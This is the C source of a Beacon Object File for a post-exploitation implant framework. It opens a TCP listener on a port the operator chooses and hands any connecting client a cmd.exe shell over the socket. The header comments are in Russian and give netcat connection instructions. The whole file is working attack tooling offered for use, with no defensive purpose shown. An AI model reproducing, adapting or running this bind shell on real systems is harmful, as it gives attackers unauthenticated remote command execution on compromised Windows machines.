// bof_bind_shell.c — bind shell via BOF.
//
// Привязывается к указанному порту и ждет входящих соединений.
// При подключении клиента запускает cmd.exe с перенаправленными
// дескрипторами. Работает с netcat: nc <target_ip> <port>

#include "..\bof_api.h"

DECLSPEC_IMPORT int WINAPI WS2_32$WSAStartup(WORD wVersionRequested, LPVOID lpWSAData);
DECLSPEC_IMPORT HANDLE WINAPI WS2_32$WSASocketA(int af, int type, int protocol, LPVOID lpProtocolInfo, DWORD g, DWORD dwFlags);
DECLSPEC_IMPORT int WINAPI WS2_32$bind(HANDLE s, const struct sockaddr* addr, int namelen);
DECLSPEC_IMPORT int WINAPI WS2_32$listen(HANDLE s, int backlog);
DECLSPEC_IMPORT HANDLE WINAPI WS2_32$accept(HANDLE s, struct sockaddr* addr, int* addrlen);
DECLSPEC_IMPORT int WINAPI WS2_32$closesocket(HANDLE s);
DECLSPEC_IMPORT unsigned short WINAPI WS2_32$htons(unsigned short hostshort);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

#define AF_INET 2
#define SOCK_STREAM 1
#define IPPROTO_TCP 6
#define MY_INVALID_SOCKET ((HANDLE)~0)
#define MY_SOCKET_ERROR (-1)

// Use system definitions

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int port = BeaconDataInt(&parser);

    if (port == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: bof bof_bind_shell.x64.o <port>\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Example: bof bof_bind_shell.x64.o 4444\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Then connect: nc <target_ip> 4444\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[bind_shell] Starting bind shell on port %d\n", port);

    // Initialize Winsock
    char wsaData[400];
    if (WS2_32$WSAStartup(0x0202, wsaData) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[bind_shell] WSAStartup failed\n");
        return;
    }

    // Create socket
    HANDLE listen_sock = WS2_32$WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (listen_sock == MY_INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_ERROR, "[bind_shell] Socket creation failed\n");
        return;
    }

    // Setup bind address
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = WS2_32$htons((unsigned short)port);
    addr.sin_addr.s_addr = 0; // INADDR_ANY

    // Zero out sin_zero
    for (int i = 0; i < 8; i++) {
        addr.sin_zero[i] = 0;
    }

    // Bind to port
    if (WS2_32$bind(listen_sock, (struct sockaddr*)&addr, sizeof(addr)) == MY_SOCKET_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[bind_shell] Bind failed on port %d\n", port);
        WS2_32$closesocket(listen_sock);
        return;
    }

    // Start listening
    if (WS2_32$listen(listen_sock, 5) == MY_SOCKET_ERROR) {
        BeaconPrintf(CALLBACK_ERROR, "[bind_shell] Listen failed\n");
        WS2_32$closesocket(listen_sock);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[bind_shell] Listening on port %d\n", port);
    BeaconPrintf(CALLBACK_OUTPUT, "[bind_shell] Waiting for connection...\n");

    // Accept incoming connection
    HANDLE client_sock = WS2_32$accept(listen_sock, NULL, NULL);
    if (client_sock == MY_INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_ERROR, "[bind_shell] Accept failed\n");
        WS2_32$closesocket(listen_sock);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[bind_shell] Client connected! Spawning cmd.exe\n");

    // Close listen socket (only handle one connection)
    WS2_32$closesocket(listen_sock);

    // Setup STARTUPINFOA
    STARTUPINFOA si;
    // Simple memset
    char* p = (char*)&si;
    for (int i = 0; i < sizeof(si); i++) {
        p[i] = 0;
    }

    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = 0x100; // STARTF_USESTDHANDLES
    si.hStdInput = client_sock;
    si.hStdOutput = client_sock;
    si.hStdError = client_sock;

    // Setup PROCESS_INFORMATION
    PROCESS_INFORMATION pi;
    p = (char*)&pi;
    for (int i = 0; i < sizeof(pi); i++) {
        p[i] = 0;
    }

    // Create cmd.exe process
    char cmd[] = "cmd.exe";
    BOOL result = KERNEL32$CreateProcessA(
        NULL,           // lpApplicationName
        cmd,            // lpCommandLine
        NULL,           // lpProcessAttributes
        NULL,           // lpThreadAttributes
        TRUE,           // bInheritHandles
        0,              // dwCreationFlags
        NULL,           // lpEnvironment
        NULL,           // lpCurrentDirectory
        &si,            // lpStartupInfo
        &pi             // lpProcessInformation
    );

    if (result) {
        BeaconPrintf(CALLBACK_OUTPUT, "[bind_shell] cmd.exe spawned successfully\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[bind_shell] Shell is now active on port %d\n", port);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[bind_shell] Failed to create process\n");
        WS2_32$closesocket(client_sock);
    }
}